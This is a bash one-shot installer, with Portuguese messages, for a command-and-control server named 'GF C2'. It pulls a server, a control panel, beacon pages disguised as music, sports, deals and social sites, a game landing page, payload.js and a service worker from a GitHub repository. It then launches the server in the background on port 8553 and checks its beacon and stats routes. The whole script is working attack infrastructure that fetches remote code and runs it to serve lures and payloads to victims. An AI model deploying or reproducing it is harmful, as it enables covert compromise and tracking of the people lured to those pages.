#!/bin/bash
# GF C2 hotfix - one-shot installer
set -u
BASE="https://raw.githubusercontent.com/paul-devopsfera/gf-kali-pkg/main"
C2DIR="${1:-$HOME/Downloads/mobile-pentest}"
TS=$(date +%Y%m%d-%H%M%S)
LOG=/tmp/gf_install.log

echo "[*] C2 dir: $C2DIR"
mkdir -p "$C2DIR/templates" "$C2DIR/static"

FILES="server.py
templates/landing.html
templates/beacon.html
templates/beacon-music.html
templates/beacon-sports.html
templates/beacon-deals.html
templates/beacon-social.html
templates/panel.html
static/payload.js
static/sw.js
static/manifest.json
static/manifest-music.json
static/manifest-sports.json
static/manifest-deals.json
static/manifest-social.json"

FAIL=0
for rel in $FILES; do
    if [ -f "$C2DIR/$rel" ]; then
        cp -a "$C2DIR/$rel" "$C2DIR/$rel.bak-$TS"
    fi
    if ! curl -fsSL "$BASE/$rel" -o "$C2DIR/$rel" 2>>"$LOG"; then
        echo "[!!] FALHOU download: $rel"
        FAIL=1
    else
        echo "[+] $rel OK"
    fi
done

echo "[*] Sanidade:"
grep -q "Access-Control-Allow-Origin" "$C2DIR/server.py" && echo "[+] CORS ok" || { echo "[!!] CORS ausente"; FAIL=1; }
grep -q "route_beacon_music" "$C2DIR/server.py" && echo "[+] rotas beacon ok" || { echo "[!!] rotas ausentes"; FAIL=1; }
grep -q "__GF_API" "$C2DIR/static/payload.js" && echo "[+] payload __GF_API ok" || { echo "[!!] payload antigo"; FAIL=1; }
grep -q "DinoRunner" "$C2DIR/templates/landing.html" && echo "[+] landing DinoRunner ok" || { echo "[!!] landing errado"; FAIL=1; }

if [ "$FAIL" -ne 0 ]; then
    echo "[!!] Abortado - arquivos nao baixaram ou invalidos. Log: $LOG"
    exit 1
fi

echo "[*] Reiniciando servidor na porta 8553..."
sudo fuser -k 8553/tcp 2>/dev/null || true
sleep 1
cd "$C2DIR" || exit 1
GF_PORT=8553 nohup python3 server.py > /tmp/c2.log 2>&1 &
sleep 3
echo "[*] Verificacao local:"
curl -s -o /dev/null -w "  GET /beacon        -> %{http_code}\n" http://127.0.0.1:8553/beacon
curl -s -o /dev/null -w "  GET /beacon-music  -> %{http_code}\n" http://127.0.0.1:8553/beacon-music
curl -s -o /dev/null -w "  GET /beacon-sports -> %{http_code}\n" http://127.0.0.1:8553/beacon-sports
curl -s -o /dev/null -w "  GET /beacon-deals  -> %{http_code}\n" http://127.0.0.1:8553/beacon-deals
curl -s -o /dev/null -w "  GET /beacon-social -> %{http_code}\n" http://127.0.0.1:8553/beacon-social
curl -s -o /dev/null -w "  GET /landing       -> %{http_code}\n" http://127.0.0.1:8553/landing
curl -s -o /dev/null -w "  GET /panel         -> %{http_code}\n" http://127.0.0.1:8553/panel
curl -s "http://127.0.0.1:8553/api/stats" | head -c 200; echo
echo "[+] Pronto. Backups: $C2DIR/*.bak-$TS"
